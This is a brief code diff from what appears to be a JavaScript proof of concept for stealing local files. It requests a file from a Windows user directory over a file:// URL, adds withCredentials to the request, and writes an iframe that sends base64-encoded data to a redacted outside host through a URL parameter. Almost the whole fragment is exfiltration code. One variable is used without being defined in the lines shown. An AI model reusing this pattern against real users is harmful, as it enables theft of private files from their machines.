@@ -24,7 +24,8 @@ function reqListener () {
     var raw = this.responseText;
     document.write('<iframe src="http://xxxxxxxxx.net?data='+b64+'"></iframe>');
 } 
-var oReq = new XMLHttpRequest(); 
+var oReq = new XMLHttpRequest();
+oReq.withCredentials = true;
 oReq.addEventListener("load", reqListener); 
 oReq.open("GET", "file:///C:/Users/xxxxx/test.txt"); 
 oReq.send();
